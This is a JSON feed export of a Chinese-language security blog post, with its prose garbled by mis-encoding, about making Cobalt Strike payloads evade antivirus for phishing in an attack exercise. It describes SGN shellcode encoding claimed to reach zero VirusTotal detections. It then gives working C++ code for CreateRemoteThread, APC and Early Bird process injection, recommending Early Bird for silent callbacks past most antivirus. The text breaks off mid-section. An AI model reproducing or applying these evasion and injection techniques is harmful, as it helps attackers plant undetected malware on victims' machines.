{
    "version": "https://jsonfeed.org/version/1",
    "title": "shutTD",
    "subtitle": "Cyber AD",
    "icon": "https://shut-td.github.io/images/favicon.ico",
    "description": "èœåªå› ~",
    "home_page_url": "https://shut-td.github.io",
    "items": [
        {
            "id": "https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
            "url": "https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
            "title": "CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°",
            "date_published": "2024-07-16T02:13:27.000Z",
            "content_html": "<h3 id=\"csåŸç”Ÿshellcodeä¸Šçº¿å…æ€\"><a class=\"anchor\" href=\"#csåŸç”Ÿshellcodeä¸Šçº¿å…æ€\">#</a> CS åŸç”Ÿ shellcode ä¸Šçº¿å…æ€</h3>\n<p>æœ€è¿‘æ”»é˜²åœ¨å³æ‰€ä»¥æƒ³è¦å°è¯•å†™å…æ€ğŸé’“é’“é±¼ï¼Œæ‰€ä»¥å°å­¦äº†ä¸€æ‰‹ä¸€äº›æ¯”è¾ƒå¥½ç”¨ä¸”å…æ€æ•ˆæœæ¯”è¾ƒå¥½çš„æ‰‹æ³•åšä¸€ä¸‹æ€»ç»“ï¼Œä»å‡ ä¸ªè§’åº¦å»ç»„åˆå…æ€ã€‚</p>\n<h5 id=\"shellcodeå…æ€\"><a class=\"anchor\" href=\"#shellcodeå…æ€\">#</a> shellcode å…æ€</h5>\n<p>sgn ç¼–ç  (å†…å­˜è‡ªè§£å¯†)ï¼Œå¯ä»¥å¾ˆå¥½çš„åšåˆ°é™æ€å…æ€çš„æ•ˆæœä¸éœ€è¦åšå…¶ä»–ä»»ä½•åŠ å¯†æ‰‹æ®µå³å¯åšåˆ°é™æ€å…æ€ï¼Œå¯ä»¥å°è¯• sgn ç¼–ç åä¼  vt ä¸€èˆ¬å°±æ˜¯ 0 æŸ¥æ€ã€‚</p>\n<p>ç”¨æ³•ï¼šå°† shellcode äºŒè¿›åˆ¶æ–‡ä»¶ä¾‹å¦‚ xx.bin ä¿å­˜ï¼Œä½¿ç”¨ sgn.exe è¿›è¡Œç¼–ç ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç³»ç»Ÿä½æ•°è¦å¯¹</p>\n<p><strong>åŸå§‹ shellcode</strong> (ç”¨ winhex ç­‰äºŒè¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€):<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg\" alt=\"\" /><br />\n<strong>sgn è¿›è¡Œç¼–ç </strong>:<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg\" alt=\"\" /><br />\n<strong> ç¼–ç åçš„ shellcode</strong>:<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg\" alt=\"\" /></p>\n<p>è¿™ç§é™æ€å…æ€æ•ˆæœå¾ˆå¥½åŸºæœ¬ä¸Šæ— éœ€åšå…¶ä»–ä»»ä½•åŠ å¯†å¤„ç†ï¼ŒåŒæ—¶è¿˜åšåˆ°äº†é™ç†µï¼Œå½“ç„¶è¿™é‡Œè¿˜å¯ä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶æ‰˜ç®¡åˆ°æœåŠ¡å™¨ä¸Šç„¶åé€šè¿‡ http è¯·æ±‚æ¥è·å– shellcodeï¼Œä¹Ÿå¯ä»¥é…åˆå›¾ç‰‡éšå†™è¿›è¡Œ shellcode çš„éšè—ã€‚</p>\n<h4 id=\"ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•\"><a class=\"anchor\" href=\"#ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•\">#</a> ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•</h4>\n<p><em><strong>CreateRemoteThread (è¿œç¨‹çº¿ç¨‹æ³¨å…¥)</strong></em><br />\n æ³¨å…¥æµç¨‹ï¼š<br />\n1ã€æ ¹æ®è¿›ç¨‹åå¯»æ‰¾ pidï¼Œç”¨äºåç»­è¿›ç¨‹æ³¨å…¥<br />\n 2ã€æ ¹æ® pid æ‰“å¼€æŒ‡å®šè¿›ç¨‹å¥æŸ„<br />\n 3ã€å‘æŒ‡å®šè¿›ç¨‹ç”³è¯·å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åŒºåŸŸ<br />\n 4ã€å°† shellcode æˆ– dll æ³¨å…¥åˆ°è¯¥å†…å­˜åŒºåŸŸä¸­<br />\n 5ã€å¼€è¾Ÿä¸€ä¸ªæ–°çº¿ç¨‹æ‰§è¡Œ</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Tlhelp32.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetProcessIdByName</span><span class=\"params\">(LPCTSTR lpszProcessName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESSENTRY32 pe;</span><br><span class=\"line\">    pe.dwSize = <span class=\"keyword\">sizeof</span> pe;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">                <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> pe.th32ProcessID;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (<span class=\"built_in\">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> path[] = <span class=\"string\">&quot;C:\\\\xxx\\\\TestDll.dll&quot;</span>;   <span class=\"comment\">//dllæ³¨å…¥</span></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;\\x12&#125;;  <span class=\"comment\">//shellcodeæ³¨å…¥ </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">DllInjectMain</span><span class=\"params\">()</span> <span class=\"comment\">//dllæ³¨å…¥</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"built_in\">GetProcessIdByName</span>((LPCTSTR)<span class=\"string\">&quot;notepad.exe&quot;</span>));    </span><br><span class=\"line\">    LPVOID lpBaseAddress = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, path, <span class=\"built_in\">sizeof</span>(path), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)<span class=\"built_in\">GetProcAddress</span>(<span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;kernel32.dll&quot;</span>), <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CreateRemoteThread</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ShellcodeInjectMain</span><span class=\"params\">()</span></span>&#123;   <span class=\"comment\">//shellcodeæ³¨å…¥</span></span><br><span class=\"line\">      HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"built_in\">GetProcessIdByName</span>((LPCTSTR)<span class=\"string\">&quot;notepad.exe&quot;</span>));</span><br><span class=\"line\">      LPVOID lpBaseAddress = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>(æˆ–è€…<span class=\"keyword\">sizeof</span> shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">      <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">      <span class=\"built_in\">CreateRemoteThread</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0</span>, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br />\n è¿™ç§ç›´æ¥çš„çº¿ç¨‹æ³¨å…¥å®¹æ˜“æš´æ¯™ï¼Œå»ºè®®æ­é…å…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚</p>\n<p><em><strong>APC Injection (APC æ³¨å…¥)</strong></em><br />\n æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ APC é˜Ÿåˆ—ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡è°ƒç”¨<strong> QueueUserAPC</strong> å‡½æ•°å°† APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­ï¼Œè°ƒç”¨çº¿ç¨‹åœ¨å¯¹<strong> QueueUserAPC</strong> çš„è°ƒç”¨ä¸­æŒ‡å®š APC å‡½æ•°çš„åœ°å€ï¼Œå½“ APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­æ—¶ï¼Œç³»ç»Ÿä¼šå‘å‡ºè½¯ä»¶ä¸­æ–­ã€‚ä¸‹æ¬¡è°ƒåº¦çº¿ç¨‹æ—¶ï¼Œå®ƒå°†è¿è¡Œ APC åŠŸèƒ½ã€‚<br />\næ³¨å…¥æµç¨‹ï¼š<br />\n1ã€æ ¹æ®è¿›ç¨‹åç¡®å®š pid<br />\n2ã€é€šè¿‡ pid éå† tid<br />\n3ã€æ’å…¥ APC é˜Ÿåˆ—</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Tlhelp32.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetProcessIdByName</span><span class=\"params\">(LPCTSTR lpszProcessName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESSENTRY32 pe;</span><br><span class=\"line\">    pe.dwSize = <span class=\"keyword\">sizeof</span> pe;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">                <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> pe.th32ProcessID;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (<span class=\"built_in\">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">GetAllThreadIdByProcessId</span><span class=\"params\">(DWORD dwProcessId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    DWORD dwBufferLength = <span class=\"number\">1000</span>;</span><br><span class=\"line\">    THREADENTRY32 te32 = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    BOOL bRet = TRUE;</span><br><span class=\"line\">    <span class=\"comment\">// è·å–çº¿ç¨‹å¿«ç…§</span></span><br><span class=\"line\">    ::<span class=\"built_in\">RtlZeroMemory</span>(&amp;te32, <span class=\"built_in\">sizeof</span>(te32));</span><br><span class=\"line\">    te32.dwSize = <span class=\"built_in\">sizeof</span>(te32);</span><br><span class=\"line\">    hSnapshot = ::<span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// è·å–ç¬¬ä¸€æ¡çº¿ç¨‹å¿«ç…§ä¿¡æ¯</span></span><br><span class=\"line\">    bRet = ::<span class=\"built_in\">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (bRet)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// è·å–è¿›ç¨‹å¯¹åº”çš„çº¿ç¨‹ID</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> te32.th32ThreadID;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// éå†ä¸‹ä¸€ä¸ªçº¿ç¨‹å¿«ç…§ä¿¡æ¯</span></span><br><span class=\"line\">        bRet = ::<span class=\"built_in\">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">DllInjdectMain</span><span class=\"params\">()</span> </span>&#123;   <span class=\"comment\">//dllæ³¨å…¥</span></span><br><span class=\"line\">    FARPROC pLoadLibrary = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD Threadid = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD ProcessId = <span class=\"number\">0</span>;</span><br><span class=\"line\">    BYTE DllName[] = <span class=\"string\">&quot;C:\\\\Users\\\\Black Sheep\\\\source\\\\repos\\\\ApcInject\\\\x64\\\\Debug\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LPVOID AllocAddr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ProcessId = <span class=\"built_in\">GetProcessIdByName</span>(<span class=\"string\">L&quot;explorer.exe&quot;</span>);</span><br><span class=\"line\">    hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, ProcessId);</span><br><span class=\"line\">    pLoadLibrary = <span class=\"built_in\">GetProcAddress</span>(<span class=\"built_in\">GetModuleHandle</span>(<span class=\"string\">L&quot;kernel32.dll&quot;</span>), <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">    AllocAddr = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(DllName) + <span class=\"number\">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, AllocAddr, DllName, <span class=\"built_in\">sizeof</span>(DllName) + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Threadid = <span class=\"built_in\">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class=\"line\">    hThread = <span class=\"built_in\">OpenThread</span>(THREAD_ALL_ACCESS, <span class=\"number\">0</span>, Threadid);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ShellcodeInjectMain</span><span class=\"params\">()</span></span>&#123;   <span class=\"comment\">//shellcodeæ³¨å…¥</span></span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD Threadid = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD ProcessId = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> shellcode[] = &#123;\\x12&#125;; <span class=\"comment\">//shellcode</span></span><br><span class=\"line\">    ProcessId = <span class=\"built_in\">GetProcessIdByName</span>(<span class=\"string\">L&quot;explorer.exe&quot;</span>);</span><br><span class=\"line\">    hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, ProcessId);</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseeAddresss, shellcode, <span class=\"built_in\">sizeof</span>(shellcode) + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Threadid = <span class=\"built_in\">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class=\"line\">    hThread = <span class=\"built_in\">OpenThread</span>(THREAD_ALL_ACCESS, <span class=\"number\">0</span>, Threadid);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em><strong>Early Bird (è¿›é˜¶ç‰ˆ APC æ³¨å…¥)</strong></em><br />\n å…ˆåˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„ç™½è¿›ç¨‹å¹¶ç”³è¯·ä¸€å— RWX å†…å­˜ç”¨äºå†™å…¥ shellcodeï¼Œå†ä½¿ç”¨ APC æ³¨å…¥æ’å…¥çº¿ç¨‹ï¼Œå†æ¢å¤çº¿ç¨‹ã€‚å®é™…ä¸Šå°±æ˜¯åœ¨ç™½è¿›ç¨‹ä¸Šå·æ‘¸æ³¨å…¥ä¸€ä¸ªæ–°çº¿ç¨‹è·‘ shellcodeã€‚<br />\næ³¨å…¥æµç¨‹è·Ÿä¸Šè¿° APC æ³¨å…¥å·®ä¸å¤š</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"string\">&quot;\\0x1&quot;</span>&#125;;  <span class=\"comment\">//æ¶æ„shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    STARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    PROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    si.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);   </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">CreateProcessA</span>(<span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n è¿™ä¸ªå…æ€æ‰‹æ³•ååˆ†çš„å¥½ç”¨ï¼Œæ¨èå†ç¨å¾®æ­é…ä¸€ä¸‹å…¶ä»–è§„é¿æ‰‹æ®µå°±å¯ä»¥ç»•è¿‡ç»å¤§å¤šæ•°æ€è½¯åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå®é™…ä»£ç å’Œä¸Šçº¿æ•ˆæœè´´åœ¨æ–‡æœ«ã€‚</p>\n<p><em><strong>Mapping Injection (å†…å­˜æ˜ å°„æ³¨å…¥)</strong></em><br />\n å…ˆåœ¨ç‰©ç†å†…å­˜ä¸­å¼€è¾Ÿä¸€æ®µç©ºé—´ç”¨äºå†™å…¥æ¶æ„ shellcodeï¼Œåç»­åˆ©ç”¨ MapViewOfFile2 å°†è¯¥æ¶æ„å†…å­˜åŒºåŸŸæ˜ 